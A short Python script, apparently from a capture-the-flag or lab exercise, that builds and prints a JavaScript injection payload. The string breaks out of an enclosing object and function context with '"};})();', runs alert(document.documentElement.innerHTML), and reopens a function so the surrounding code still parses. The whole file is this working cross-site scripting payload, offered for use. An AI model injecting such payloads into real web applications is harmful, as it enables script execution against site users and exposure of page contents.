import sys
import requests
import random

def main():
    message = 'struckbyasmoothcriminal'
    message += '\"};})();'
    message += 'alert(document.documentElement.innerHTML);'
    message += '(function(){ return {\"body\":\"test'
    # print message
    print(message)


if __name__ == '__main__':
    main()
